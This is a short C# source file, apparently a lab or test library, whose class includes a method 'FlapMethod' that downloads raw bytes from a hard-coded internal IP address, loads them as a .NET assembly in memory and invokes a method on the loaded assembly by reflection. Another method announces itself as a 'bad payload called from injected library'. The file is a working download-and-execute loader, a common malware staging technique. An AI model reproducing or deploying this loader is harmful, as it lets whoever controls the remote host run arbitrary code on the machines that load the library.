using System;
using System.Net;
using System.Reflection;

namespace testlibrary
{
    public class Testclass
    {
        public Testclass()
        {
            Console.WriteLine("This is Constructor");
        }

        public void TestMethod()
        {
            Console.WriteLine("This is test method");
        }

        public void FlapMethod(){
            Console.WriteLine("Faan");

            WebClient wc = new WebClient();
            byte[] data = wc.DownloadData("Http://10.20.29.137:8000/HELLOWORLD");
            var instance = Assembly.Load(data).CreateInstance("testlibrary.Testclass");
            //if (instance == null)return;
            //try{
                //Console.WriteLine("Faan calling Faan");
                instance.GetType().InvokeMember("FlapMethod",BindingFlags.InvokeMethod,null,instance,null);
            //}catch(Exception e){}
        }

        public void CallBad(){
            Console.WriteLine("I am bad payload called from injected library");
        }
    }
}
